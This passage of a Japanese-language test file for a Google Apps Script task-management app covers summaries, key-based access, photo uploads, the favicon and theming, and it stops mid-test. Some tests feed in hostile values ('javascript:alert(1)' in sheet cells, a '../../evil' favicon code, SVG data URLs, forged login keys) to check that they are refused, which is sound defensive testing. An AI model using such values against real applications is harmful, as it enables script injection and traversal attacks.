  ok('リンクの字への置き換えに失敗しても、リストはできて、URL がそのまま入る。できなかったことが返る', SB()['稼働リスト']._d.length === 8 && /^https:\/\/www\.google\.com\/maps\//.test(row('A')[col('開始場所')]) && sm.notes.length === 1 && /リンク: Rich text not available/.test(sm.notes[0]) && sm.pivot === true);
  e31.decoFail = 'createFilter';
  sm = a31.openSummary();
  ok('絞り込みを付けられなくても、ほかはできる', sm.notes.length === 1 && /絞り込み/.test(sm.notes[0]) && SB()['稼働リスト']._bands.length === 1);
  e31.decoFail = '';
  e31.pivotFail = true;
  sm = a31.openSummary();
  ok('ピボットテーブルを作れなくても、「稼働リスト」はできて、理由を返す', sm.pivot === false && sm.viewUrl === '' && sm.notes.some(n => /サマリー: Pivot tables are not available/.test(n)) && SB()['稼働リスト']._d.length === 8);
  e31.pivotFail = false;
  // 前の版のシート
  e31.sheets['集計データ'] = { getName: () => '集計データ' }; e31.sheets['稼働リスト'] = { getName: () => '稼働リスト' }; e31.sheets['サマリー'] = { getName: () => 'サマリー' };
  sm = a31.openSummary();
  ok('前の版が元のスプレッドシートに作った集計のシート（稼働リスト・サマリー・集計データ）は片付ける。元のスプレッドシートには、データのシートだけが残る', !e31.sheets['集計データ'] && !e31.sheets['稼働リスト'] && !e31.sheets['サマリー'] && !!e31.sheets.tasks && SB()['稼働リスト']._d.length === 8);
  const sumFile = e31.drive.filter(f => f.id === e31.props.SUM_FILE)[0];
  ok('集計のスプレッドシートは、ドライブのプロジェクトのフォルダの直下に「稼働リスト - プロジェクト名」の名前でできる。初めからある空のシートは外す', /^稼働リスト - /.test(sumFile.name) && sumFile.parents[0] === e31.props.PHOTO_FOLDER && Object.keys(SB()).sort().join() === 'サマリー,稼働リスト');
  const nFiles = e31.drive.length;
  a31.openSummary();
  ok('もう一度作っても、ファイルは増えない', e31.drive.length === nFiles);
  sumFile.trashed = true;
  sm = a31.openSummary();
  ok('集計のスプレッドシートを消されていたら、作り直す', e31.props.SUM_FILE !== sumFile.id && SB()['稼働リスト']._d.length === 8 && sm.notes.length === 0);
  // シフトとの関係
  {
    const h2 = SB()['稼働リスト']._d[0], c2 = (n) => h2.indexOf(n), r2 = (t) => SB()['稼働リスト']._d.filter(r => r[c2('タスク')] === t)[0];
    ok('シフトの列: シフトを入れていない日は「なし」「シフトなし」。完了した分は、ぜんぶシフト外稼働に数える', c2('当日のシフト') > c2('遅延（分）') && r2('A')[c2('当日のシフト')] === 'なし' && r2('A')[c2('シフト内外')] === 'シフトなし' && r2('A')[c2('シフト外稼働（分）')] === 45 && r2('だれかに')[c2('シフト内外')] === '' && r2('だれかに')[c2('当日のシフト')] === '');
    a31.saveShift({ member: 'sato@example.com', date: '2026-11-13', start: '09:30', end: '18:00', repeat: 'none', days: [], until: '' });
    a31.openSummary();
    const r3 = (t) => SB()['稼働リスト']._d.filter(r => r[c2('タスク')] === t)[0];
    ok('シフトを入れた日: シフトの時刻が出る。実際の稼働（9:12–9:57）がシフト（9:30–）にかかっていれば「一部シフト外」で、外の分（18 分）が出る', r3('A')[c2('当日のシフト')] === '9:30–18:00' && r3('A')[c2('シフト内外')] === '一部シフト外' && r3('A')[c2('シフト外稼働（分）')] === 18);
    a31.saveShift({ id: a31.getState({ day: '2026-11-13' }).shifts[0].id, member: 'sato@example.com', date: '2026-11-13', start: '09:00', end: '18:00', repeat: 'none', days: [], until: '' });
    a31.openSummary();
    ok('稼働がシフトの中におさまっていれば「シフト内」（外の分は 0）', r3('A')[c2('シフト内外')] === 'シフト内' && r3('A')[c2('シフト外稼働（分）')] === 0);
    a31.saveShift({ id: a31.getState({ day: '2026-11-13' }).shifts[0].id, member: 'sato@example.com', date: '2026-11-13', start: '13:00', end: '18:00', repeat: 'none', days: [], until: '' });
    a31.openSummary();
    ok('シフトの時間の外だけで稼働していれば「シフト外」', r3('A')[c2('シフト内外')] === 'シフト外' && r3('A')[c2('シフト外稼働（分）')] === 45);
  }
  // ドライブを使えないとき
  e31.noDrive = true;
  sm = a31.openSummary();
  ok('ドライブに作れないときは、元のスプレッドシートの中に作り、そのことを知らせる', sm.own === false && !!e31.sheets['稼働リスト'] && e31.sheets['稼働リスト']._d.length === 8 && /^https:\/\/docs\.google\.com\/spreadsheets\/d\/SHEET1\//.test(sm.url) && sm.notes.some(n => /データ用スプレッドシート内に作成しました/.test(n)));
  e31.noDrive = false;
  // 権限
  e31.user = 'takahashi@example.com';
  throws('メンバーは、集計を作れない', () => a31.openSummary(), /管理者/);
  ok('メンバーには、スプレッドシートを開く先は届かない', a31.getState().sheetUrl === '');
  e31.user = '';
  throws('ログインしていない人は、集計を作れない', () => a31.openSummary(), /アカウントを確認できません/);
  e31.user = 'admin@example.com';
  a31.resetProject();
  ok('リセットすると、元のスプレッドシートの集計のシートも、覚えていた集計の置き場所も消える（ドライブのファイルは残す）', !e31.sheets['稼働リスト'] && !e31.sheets['サマリー'] && !e31.props.SUM_FILE && !e31.props.FOLDERS);
  a31.initProject({ name: '空' });
  sm = a31.openSummary();
  ok('タスクがないときは、見出しだけの「稼働リスト」を作り、サマリーは作らない', sm.rows === 0 && sm.pivot === false && sm.notes.length === 0 && SB()['稼働リスト']._d.length === 1 && !SB()['サマリー']);
}

// 入口の見張り（URL は誰でも開ける。だれか分からない人のために、シートを読まない）
{
  const e32 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a32 = e32.api; e32.now = at(8);
  a32.initProject({ name: '訪問サービス' });
  e32.autoJoin = false; a32.addMember({ email: 'guest@gmail.com', name: '外の人', board: '' });
  const key = (e32.mails[0].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  e32.user = ''; a32.joinProject({ key, name: '外の人' });
  const z = () => { e32.reads.sheets = 0; e32.reads.open = 0; e32.reads.batch = 0; };
  const noRead = () => e32.reads.sheets === 0 && e32.reads.open === 0 && e32.reads.batch === 0;
  e32.cache = {};
  ok('鍵で入ったメンバーのために、鍵の番号の一覧を 1 回だけ覚える（開くたびに書き直さない）', (() => { a32.getState({ key }); const n = e32.reads.cachePut; a32.getState({ key }); a32.getState({ key }); return e32.reads.cachePut === n && !!e32.cache.nonces; })());
  z(); throws('アカウントも鍵もない人は断る', () => a32.getState(), /アカウントを確認できません/);
  ok('そのとき、シートは 1 枚も読まない（まとめ読みもしない）', noRead());
  z(); throws('鍵の形が違うものは断る', () => a32.getState({ key: 'abc' }), /アカウントを確認できません/);
  ok('形が違う鍵でも、シートは読まない', noRead());
  z(); throws('長すぎる・記号入りの鍵も断る', () => a32.getState({ key: 'n' + 'a'.repeat(500) + '.' + 'b'.repeat(32) }), /アカウントを確認できません/);
  ok('そのときも読まない', noRead());
  z(); const pg = a32.doGet({ parameter: {} });
  ok('最初のページも、だれか分からない人のためにはシートを読まない（ページそのものは返す）', noRead() && pg.title === 'Scurrop');
  z(); throws('操作も、シートを読む前に断る', () => a32.createTask({ title: 'x', start: at(9), end: at(10) }), /アカウントを確認できません/);
  ok('操作を断るときも読まない', noRead());
  // 形は合っているが、知らない鍵
  const fake = (i) => 'n' + ('000000000000000' + i).slice(-15) + '.' + 'A'.repeat(32);
  z(); throws('形は合っているが知らない鍵は、シートを読まずに断る（鍵の番号が一覧にない）', () => a32.getState({ key: fake(0) }), /アカウントを確認できません/);
  ok('そのときも読まない', noRead());
  for (let i = 1; i < 60; i++) { try { a32.getState({ key: fake(i) }); } catch (err) { /* 断られる */ } }
  ok('でたらめな鍵を何度送られても、シートは読まない', noRead());
  ok('そのあとも、本物の鍵は通る（でたらめな鍵では、ほかの人を締め出せない）', a32.getState({ key }).me.role === 'member');
  // 番号は合っているが、しるしが違う鍵（番号を知っている人が、でたらめなしるしを付けた）
  throws('番号が合っていても、しるしが違えば断る', () => a32.getState({ key: key.split('.')[0] + '.' + 'A'.repeat(32) }), /アカウントを確認できません/);
  // 覚えた一覧が切れたあと
  e32.cache = {};
  z(); throws('一覧を覚えていないときは、メンバーのシートを 1 回だけ読んで作り、知らない鍵を断る', () => a32.getState({ key: fake(100) }), /アカウントを確認できません/);
  ok('（読むのはメンバーの 1 枚だけ。まとめ読みはしない）', e32.reads.sheets === 1 && e32.reads.batch === 0);
  z(); throws('次の知らない鍵では、もう読まない', () => a32.getState({ key: fake(101) }), /アカウントを確認できません/);
  ok('（読まない）', noRead());
  // メンバーを足したら、一覧は作り直す
  e32.user = 'admin@example.com'; e32.autoJoin = false;
  a32.addMember({ email: 'second@gmail.com', name: '2 人目', board: '' });
  const key2 = (e32.mails[e32.mails.length - 1].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  e32.user = '';
  ok('足したばかりのメンバーの鍵も、すぐに通る（一覧を作り直す）', a32.getState({ key: key2 }).me.role === 'invited');
  e32.user = 'admin@example.com'; a32.renewKey('guest@gmail.com'); e32.user = '';
  throws('鍵を作り直したら、前の鍵は、シートを読まずに断る', () => { try { a32.getState({ key: fake(102) }); } catch (err) { /* 一覧を作り直す */ } z(); a32.getState({ key }); }, /アカウントを確認できません/);
  ok('（読まない）', noRead());
  const key3 = (e32.mails[e32.mails.length - 1].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  ok('新しい鍵は通る', a32.getState({ key: key3 }).me.role === 'member');
  e32.user = 'admin@example.com';
  ok('Google アカウントで来た人は、これまでどおり', a32.getState().me.role === 'admin');
  e32.user = '';
  // 覚えておく場所が使えないとき
  e32.noCache = true;
  ok('覚えておく場所が使えなくても、メンバーの鍵は通る', a32.getState({ key: key3 }).me.role === 'member');
  throws('覚えておく場所が使えなくても、知らない鍵は断る', () => a32.getState({ key: fake(101) }), /アカウントを確認できません/);
  e32.noCache = false;
}

// だれが何を変えたかの記録と、リンクの作り直し
{
  const e33 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a33 = e33.api; e33.now = at(8);
  a33.initProject({ name: '訪問サービス' });
  a33.addBoard({ name: '東', color: '#2279B6' });
  a33.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  e33.autoJoin = false; a33.addMember({ email: 'guest@gmail.com', name: '外の人', board: '' });
  const key1 = (e33.mails[e33.mails.length - 1].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  e33.user = ''; a33.joinProject({ key: key1, name: '外の人' }); e33.user = 'admin@example.com';
  const notes = () => a33.getState().history.map(h => h.action + ':' + h.email + ':' + h.note);
  ok('参加したことが、本人の名前で残る', notes().some(n => n === 'member:guest@gmail.com:参加'));
  a33.updateMember('sato@example.com', { name: '佐藤 美咲', role: 'admin', board: '東' });
  ok('ロールを変えたことが、変えた人の名前で残る', notes().some(n => /^member:admin@example\.com:sato@example\.com のロール（管理者）・ボードを変更$/.test(n)));
  const n0 = notes().length;
  a33.updateMember('sato@example.com', { name: '佐藤 美咲', role: 'admin', board: '東' });
  ok('何も変えていない保存は、記録しない', notes().length === n0);
  a33.updateMember('sato@example.com', { name: '佐藤 美咲', role: 'member', board: '東' });
  ok('管理者から外したことも残る', notes().some(n => /sato@example\.com のロール（メンバー）を変更/.test(n)));
  const rule = a33.getState().rules.filter(r => r.when === 'start')[0];
  a33.setRule(rule.id, true); a33.addRule({ when: 'done', then: ['notify_admin'] }); a33.deleteRule(rule.id);
  ok('ルールをオンにした・足した・消したことが残る', notes().some(n => /^setting:admin@example\.com:通知「開始」をオン$/.test(n)) && notes().some(n => /通知「完了」を追加/.test(n)) && notes().some(n => /通知「開始」を削除/.test(n)));
  // リンクの作り直し
  let st = a33.getState();
  const before = st.members.filter(m => m.email === 'guest@gmail.com')[0].link;
  ok('管理者には、組織の外のメンバーのリンクが届く（同じ組織の人にはリンクがない）', before.includes('?k=' + key1) && st.members.filter(m => m.email === 'sato@example.com')[0].link === '');
  e33.mails.length = 0;
  st = a33.renewKey('guest@gmail.com');
  const key2 = (e33.mails[0].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  ok('リンクを作り直すと、新しいリンクが本人にメールで届く', e33.mails.length === 1 && e33.mails[0].to === 'guest@gmail.com' && /リンクが再発行されました/.test(e33.mails[0].subject) && !!key2 && key2 !== key1 && e33.mails[0].options.htmlBody.includes('Scurrop を開く') && !st.notice);
  e33.user = '';
  throws('前のリンクは使えなくなる', () => a33.getState({ key: key1 }), /アカウントを確認できません/);
  ok('新しいリンクで入れる', a33.getState({ key: key2 }).me.role === 'member');
  e33.user = 'admin@example.com';
  ok('作り直したことが残る', notes().some(n => /guest@gmail\.com のリンクを再発行/.test(n)));
  throws('同じ組織のメンバーには、作り直すリンクがない', () => a33.renewKey('sato@example.com'), /Google アカウントで認証する/);
  e33.user = 'sato@example.com';
  throws('メンバーは、リンクを作り直せない', () => a33.renewKey('guest@gmail.com'), /管理者/);
  ok('メンバーには、ほかの人のリンクは届かない', !JSON.stringify(a33.getState()).includes('?k='));
  e33.user = 'admin@example.com';
  a33.removeMember('guest@gmail.com');
  ok('メンバーを外したことが残る', notes().some(n => /^member:admin@example\.com:guest@gmail\.com をメンバーから削除$/.test(n)));
  e33.user = '';
  throws('外したメンバーのリンクは使えない', () => a33.getState({ key: key2 }), /アカウントを確認できません/);
}

// 開発中の確認の表示は、合図（?debug=1）を付けたときだけ
{
  const e34 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a34 = e34.api; e34.now = at(8);
  a34.initProject({ name: '訪問サービス' });
  ok('ふだんのページには、確認の表示の合図は入らない', JSON.parse(a34.doGet({ parameter: {} }).boot).debug === false);
  ok('?debug=1 を付けたときだけ、合図が入る', JSON.parse(a34.doGet({ parameter: { debug: '1' } }).boot).debug === true && JSON.parse(a34.doGet({ parameter: { debug: 'true' } }).boot).debug === false);
}

// 画面の明るさ（ライト／ダーク／端末に合わせる）
{
  const e35 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a35 = e35.api; e35.now = at(8);
  a35.initProject({ name: '訪問サービス' });
  a35.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  ok('初めはライト（白い背景）', a35.getState().project.mode === 'light' && JSON.parse(a35.doGet({ parameter: {} }).boot).mode === 'light');
  let st = a35.setMode('dark');
  ok('ダークに変えられる。最初のページにも入る', st.project.mode === 'dark' && e35.props.MODE === 'dark' && JSON.parse(a35.doGet({ parameter: {} }).boot).mode === 'dark');
  ok('端末に合わせる、にもできる', a35.setMode('auto').project.mode === 'auto');
  throws('決まった 3 つ以外は断る', () => a35.setMode('pink'), /表示モードの指定/);
  throws('空も断る', () => a35.setMode(), /表示モードの指定/);
  e35.user = 'sato@example.com';
  ok('メンバーの画面にも同じ明るさが届く', a35.getState().project.mode === 'auto');
  throws('メンバーは、明るさを変えられない', () => a35.setMode('dark'), /管理者/);
  e35.user = 'someone@gmail.com';
  ok('登録のない人には、明るさの設定を渡さない（ライトのまま）', JSON.parse(a35.doGet({ parameter: {} }).boot).mode === 'light' && a35.getState().project.mode === 'light');
  e35.user = 'admin@example.com';
  ok('ライトに戻すと、覚えていた設定は消える', a35.setMode('light').project.mode === 'light' && e35.props.MODE === undefined);
  a35.setMode('dark'); a35.resetProject();
  ok('リセットすると、明るさの設定も消える', e35.props.MODE === undefined);
  // ダークの色（文字と背景の差）
  const css = require('fs').readFileSync(__dirname + '/../src/index.html', 'utf8');
  const dark = (css.match(/:root\[data-mode="dark"\]\{([^}]+)\}/) || [])[1] || '';
  const tok = (n) => (dark.match(new RegExp('--' + n + ':(#[0-9A-Fa-f]{6})')) || [])[1];
  const lum = (hex) => { const lin = (i) => { const c = parseInt(hex.substr(i, 2), 16) / 255; return c <= 0.03928 ? c / 12.92 : Math.pow((c + 0.055) / 1.055, 2.4); }; return 0.2126 * lin(1) + 0.7152 * lin(3) + 0.0722 * lin(5); };
  const cr = (a, b) => (Math.max(lum(a), lum(b)) + 0.05) / (Math.min(lum(a), lum(b)) + 0.05);
  ok('ダークの色: 文字は、背景・カード・一段上の面のどこでも読める（明るさの比 4.5 以上）', ['ink', 'ink2', 'muted'].every(t => ['ground', 'surface', 'raised'].every(bg => cr(tok(t), tok(bg)) >= 4.5)));
  ok('ダークの色: 遅延の文字は、遅延の面の上で読める', cr(tok('late-ink'), tok('late-bg')) >= 4.5);
  ok('部品の側に、白や黒を直接は書いていない（色は、明るさで切り替わる変数から取る）', !/color-mix\([^)]*,#fff\)[^']*background|background:#fff[;'"]/.test(css.replace(/\.switch i\{[^}]+\}|\.sw i\{[^}]+\}/g, '')));
}

// 報告の写真（元の画像はドライブ、小さい画像はシート）
{
  const e36 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a36 = e36.api; e36.now = at(8);
  a36.initProject({ name: '訪問サービス' });
  a36.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a36.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: '' });
  let st = a36.saveTemplate({ name: '点検', board: '', minutes: 60, fields: [{ label: '現場の写真', type: 'photo', required: true }, { label: 'メモ', type: 'text' }] });
  const tpl = st.templates[0]; const pf = tpl.fields.filter(f => f.type === 'photo')[0];
  ok('テンプレートに「写真」のフィールドを足せる', !!pf && pf.label === '現場の写真' && pf.required === true);
  const t1 = a36.createTask({ title: '点検 A', member: 'sato@example.com', start: at(9), end: at(10), templateId: tpl.id }).tasks.filter(t => t.title === '点検 A')[0];
  const t2 = a36.createTask({ title: 'ふつう', member: 'sato@example.com', start: at(11), end: at(12) }).tasks.filter(t => t.title === 'ふつう')[0];
  const TH = 'data:image/jpeg;base64,' + 'A'.repeat(2000), FULL = 'data:image/jpeg;base64,' + Buffer.from('x'.repeat(30000)).toString('base64');
  e36.user = 'sato@example.com'; e36.now = at(9, 1);
  a36.updateTask(t1.id, 'start', {});
  throws('必須の写真がないと、完了にできない', () => a36.updateTask(t1.id, 'done', {}), /「現場の写真」の写真を添付してください/);
  let r = a36.addTaskPhoto(t1.id, { field: pf.key, thumb: TH, full: FULL });
  ok('メンバーは、自分のタスクの写真を足せる。元の画像はドライブに入り、開く先が返る', /^https:\/\/drive\.google\.com\/file\/d\/drv\d+\/view$/.test(r.photo.url) && r.photo.thumb === TH && r.notice === '');
  const folder = e36.drive.filter(f => f.folder)[0], file = e36.drive.filter(f => !f.folder)[0];
  const ymNow = todayText.slice(0, 7);
  const dirP = e36.drive.filter(f => f.folder && f.name === '写真')[0], dirM = e36.drive.filter(f => f.folder && f.name === ymNow)[0];
  ok('ドライブには、プロジェクトの名前のフォルダができ、その中の「写真」の、月ごとのフォルダ（2026-11 のような名前）に画像が入る', !!folder && folder.name === 'Scurrop - 訪問サービス' && dirP.parents[0] === folder.id && dirM.parents[0] === dirP.id && file.parents[0] === dirM.id && JSON.parse(e36.props.FOLDERS).dirs['写真/' + ymNow] === dirM.id && file.mimeType === 'image/jpeg' && file.size === 30000 && new RegExp('^' + todayText + '_\\d{3,4}_点検 A\\.jpg$').test(file.name) && e36.props.PHOTO_FOLDER === folder.id);
  ok('シートには、写真の記録（task_photos）と小さい画像（task_thumbs）が 1 行ずつ入る', e36.sheets.task_photos._d.length === 2 && e36.sheets.task_thumbs._d.length === 2 && e36.sheets.task_photos._d[1][5] === file.id);
  a36.addTaskPhoto(t1.id, { field: pf.key, thumb: TH, full: FULL });
  ok('2 枚目も同じフォルダに入る（フォルダは作り直さない）', e36.drive.filter(f => f.folder).length === 3 && e36.drive.filter(f => !f.folder).length === 2 && e36.drive.filter(f => !f.folder)[1].parents[0] === dirM.id);
  st = a36.getState();
  ok('15 秒おきの更新には、写真の数だけが載る（画像そのものは載らない）', st.tasks.filter(t => t.id === t1.id)[0].photos === 2 && st.tasks.filter(t => t.id === t2.id)[0].photos === 0 && !JSON.stringify(st).includes('AAAAAAAAAA'));
  let list = a36.getTaskPhotos(t1.id);
  ok('自分のタスクの写真を読める（小さい画像と、開く先）', list.length === 2 && list[0].thumb === TH && /drive\.google\.com/.test(list[0].url) && list[0].field === pf.key);
  throws('写真の欄がないタスクには足せない', () => a36.addTaskPhoto(t2.id, { field: pf.key, thumb: TH, full: FULL }), /写真フィールドがありません/);
  throws('画像でないものは断る', () => a36.addTaskPhoto(t1.id, { field: pf.key, thumb: TH, full: 'https://example.com/a.jpg' }), /読み込めませんでした/);
  throws('小さい画像が大きすぎたら断る', () => a36.addTaskPhoto(t1.id, { field: pf.key, thumb: 'data:image/jpeg;base64,' + 'A'.repeat(46000), full: FULL }), /写真/);
  throws('元の画像が大きすぎたら断る', () => a36.addTaskPhoto(t1.id, { field: pf.key, thumb: TH, full: 'data:image/jpeg;base64,' + 'A'.repeat(4000001) }), /大きすぎる/);
  throws('SVG などは断る', () => a36.addTaskPhoto(t1.id, { field: pf.key, thumb: 'data:image/svg+xml;base64,AAAA', full: FULL }), /写真/);
  e36.user = 'takahashi@example.com';
  throws('ほかの人のタスクには足せない', () => a36.addTaskPhoto(t1.id, { field: pf.key, thumb: TH, full: FULL }), /担当ではありません/);
  throws('ほかの人のタスクの写真は読めない', () => a36.getTaskPhotos(t1.id), /担当ではありません/);
  throws('ほかの人のタスクの写真は消せない', () => a36.removeTaskPhoto(list[0].id), /担当ではありません/);
  e36.user = '';
  throws('ログインしていない人は、写真を読めない', () => a36.getTaskPhotos(t1.id), /アカウントを確認できません/);
  e36.user = 'sato@example.com';
  list = a36.removeTaskPhoto(list[0].id);
  ok('本人は、完了するまで写真を消せる。ドライブのファイルはゴミ箱に入る', list.length === 1 && e36.drive.filter(f => !f.folder && f.trashed).length === 1 && e36.sheets.task_photos._d.length === 2 && e36.sheets.task_thumbs._d.length === 2);
  st = a36.updateTask(t1.id, 'done', {});
  ok('写真があれば、完了にできる', st.tasks.filter(t => t.id === t1.id)[0].status === 'done');
  throws('完了したあとは、本人は写真を足せない', () => a36.addTaskPhoto(t1.id, { field: pf.key, thumb: TH, full: FULL }), /完了したタスク/);
  throws('完了したあとは、本人は写真を消せない', () => a36.removeTaskPhoto(list[0].id), /完了したタスク/);
  e36.user = 'admin@example.com';
  list = a36.getTaskPhotos(t1.id);
  ok('管理者は、どのタスクの写真も読める', list.length === 1 && !!list[0].thumb && !!list[0].url);
  ok('写真を足した・消したことが履歴に残る', a36.getState().history.filter(h => h.task === t1.id && h.action === 'photo').length === 3);
  // ドライブに保存できないとき
  const t3 = a36.createTask({ title: '点検 B', member: 'sato@example.com', start: at(13), end: at(14), templateId: tpl.id }).tasks.filter(t => t.title === '点検 B')[0];
  e36.user = 'sato@example.com';
  e36.driveFail = true;
  r = a36.addTaskPhoto(t3.id, { field: pf.key, thumb: TH, full: FULL });
  ok('ドライブに保存できなくても、小さい画像は残り、理由が出る', r.photo.url === '' && r.photo.thumb === TH && /元画像をドライブに保存できませんでした.*storage quota/.test(r.notice) && a36.getTaskPhotos(t3.id).length === 1);
  e36.driveFail = false; e36.needAuth = true;
  r = a36.addTaskPhoto(t3.id, { field: pf.key, thumb: TH, full: FULL });
  ok('承認がまだのときは、そう出る', /承認が必要です（エディタで authorize を実行）/.test(r.notice) && r.photo.url === '');
  e36.needAuth = false; e36.noDrive = true;
  r = a36.addTaskPhoto(t3.id, { field: pf.key, thumb: TH, full: FULL });
  ok('Drive のサービスが入っていないときも、小さい画像は残る', /サービスが有効になっていません/.test(r.notice) && a36.getTaskPhotos(t3.id).length === 3);
  e36.noDrive = false;
  for (let i = 0; i < 9; i++) a36.addTaskPhoto(t3.id, { field: pf.key, thumb: TH, full: FULL });
  throws('1 つのタスクに 12 枚まで', () => a36.addTaskPhoto(t3.id, { field: pf.key, thumb: TH, full: FULL }), /最大 12 枚/);
  // フォルダを手で消したとき
  e36.drive.filter(f => f.folder).forEach(f => { f.trashed = true; });
  e36.user = 'admin@example.com';
  const t4 = a36.createTask({ title: '点検 C', member: 'sato@example.com', start: at(15), end: at(16), templateId: tpl.id }).tasks.filter(t => t.title === '点検 C')[0];
  r = a36.addTaskPhoto(t4.id, { field: pf.key, thumb: TH, full: FULL });
  ok('ドライブのフォルダを消されていたら、作り直して保存する（いちばん上・写真・月のフォルダ）', !!r.photo.url && e36.drive.filter(f => f.folder && !f.trashed).map(f => f.name).join() === 'Scurrop - 訪問サービス,写真,' + ymNow && e36.drive[e36.drive.length - 1].parents[0] === e36.drive.filter(f => f.folder && !f.trashed && f.name === ymNow)[0].id);
  // シートを手で書き換えたとき
  const pd = e36.sheets.task_photos._d; pd[pd.length - 1][5] = 'javascript:alert(1)';
  const td = e36.sheets.task_thumbs._d; td[td.length - 1][1] = 'javascript:alert(1)';
  list = a36.getTaskPhotos(t4.id);
  ok('シートの欄に、画像やファイルの番号でないものが入っていたら、渡さない', list[0].url === '' && list[0].thumb === '');
  // タスクを消す
  const before = e36.drive.filter(f => !f.folder && !f.trashed).length;
  a36.deleteTask(t3.id);
  ok('タスクを消すと、その写真の記録も消え、ドライブのファイルはゴミ箱に入る', !e36.sheets.task_photos._d.some(x => x[1] === t3.id) && e36.drive.filter(f => !f.folder && !f.trashed).length < before);
  a36.resetProject();
  ok('リセットしても、ドライブのフォルダと画像は消さない（フォルダの覚えだけ消す）', e36.props.PHOTO_FOLDER === undefined && e36.drive.some(f => f.folder && !f.trashed) && !e36.sheets.task_photos);
}

// 履歴の言い回しは、体言止めにそろえる（「写真を消した」ではなく「写真を削除」）
{
  const src = require('fs').readFileSync(process.argv[2] || __dirname + '/../src/Code.gs', 'utf8');
  const notes = (src.match(/logHistory_\([^\n]*/g) || []).join('\n');
  const bad = notes.match(/'[^']*(した|ました|ません|でした|できず|せず|れず)[^']*'/g) || [];
  ok('履歴に残す言葉に、「〜した」「〜できませんでした」のような言い方がない' + (bad.length ? ' → ' + bad.join(' | ') : ''), bad.length === 0);
}

// スマホの画面の幅（日付の枠がはみ出る、画面が拡大できてしまう）
{
  const code = require('fs').readFileSync(process.argv[2] || __dirname + '/../src/Code.gs', 'utf8');
  const page = require('fs').readFileSync(__dirname + '/../src/index.html', 'utf8');
  ok('画面の幅は端末の幅に固定し、拡大させない', /addMetaTag\('viewport', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'\)/.test(code));
  ok('日付と時刻の欄は、親の幅に収まるようにしてある（iPhone ではみ出さないように）', /input\[type="date"\],input\[type="time"\]\{-webkit-appearance:none;appearance:none;display:block;min-width:0\}/.test(page) && /\.fieldbox input,\.fieldbox select,\.fieldbox textarea\{min-width:0;max-width:100%\}/.test(page));
  ok('スマホの幅では、入力欄の文字を 16px にする（押したときに勝手に拡大しないように）', /input,select,textarea\{font-size:var\(--fs-input\)\}/.test(page) && /@media \(max-width:520px\)\{:root\{--fs-input:var\(--fs-md\)\}\}/.test(page) && /--fs-md:16px/.test(page));
}

// ファビコン（Google が配っている絵文字の画像を使う。開発元のサーバーには取りに行かない）
{
  const e37 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a37 = e37.api; e37.now = at(8);
  a37.initProject({ name: '訪問サービス' });
  a37.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  const fav = () => a37.doGet({ parameter: {} }).favicon;
  ok('初めのファビコンは、Google のハムスターの絵文字', fav() === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f439/72.png' && a37.getState().favicon.code === '1f439' && a37.getState().favicon.base === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/');
  ok('ファビコンの画像は、Google の場所（fonts.gstatic.com）からだけ取る。開発元のサーバーや GitHub は出てこない', !/hamnism\.com|githubusercontent|raw\.github/.test(require('fs').readFileSync(process.argv[2] || __dirname + '/../src/Code.gs', 'utf8').replace(/REPO_URL = '[^']+'/, '')));
  let st = a37.setFavicon('1f69a');
  ok('設定で、ほかの絵文字に変えられる（次に開いたときから）', st.favicon.code === '1f69a' && fav() === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f69a/72.png' && e37.props.FAVICON_EMOJI === '1f69a');
  ok('組み合わせの絵文字（番号を「_」でつないだもの）も選べる', a37.setFavicon('1F468_200D_1F4BB').favicon.code === '1f468_200d_1f4bb');
  throws('絵文字の番号でないものは断る', () => a37.setFavicon('../../evil'), /絵文字を 1 つ/);
  throws('URL は断る', () => a37.setFavicon('https://example.com/a.png'), /絵文字を 1 つ/);
  throws('空は断る', () => a37.setFavicon(''), /絵文字を 1 つ/);
  ok('断られたあとも、前のまま', a37.getState().favicon.code === '1f468_200d_1f4bb');
  e37.user = 'sato@example.com';
  throws('メンバーは、ファビコンを変えられない', () => a37.setFavicon('1f439'), /管理者/);
  ok('メンバーには、ファビコンの設定は届かない（ページのファビコンは同じ）', a37.getState().favicon === null && fav() === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f468_200d_1f4bb/72.png');
  e37.user = 'admin@example.com';
  ok('ハムスターに戻すと、覚えていた設定は消える', a37.setFavicon('1f439').favicon.code === '1f439' && e37.props.FAVICON_EMOJI === undefined);
  e37.props.FAVICON_EMOJI = 'zzzz';
  ok('シートやプロパティに変な値が入っていても、ハムスターに戻る', fav() === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f439/72.png');
  a37.setFavicon('1f69a'); a37.resetProject();
  ok('リセットすると、ファビコンの設定も消える', e37.props.FAVICON_EMOJI === undefined);
}

// Meet: 続けて作って、Google の回数の上限に当たったとき（2026-11-15 実機: Rate Limit Exceeded）
{
  const e38 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a38 = e38.api; e38.now = at(8);
  a38.initProject({ name: '訪問サービス' });
  a38.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  const task = (st, title) => st.tasks.filter(t => t.title === title)[0];
  const cell = (id) => { const d = e38.sheets.tasks._d; return d.filter(x => x[0] === id)[0][d[0].indexOf('meet')]; };
  e38.meetRate = 1; e38.slept = 0;
  let st = a38.createTask({ title: '1 回目だけ上限', member: 'sato@example.com', start: at(9), end: at(10), meet: true });
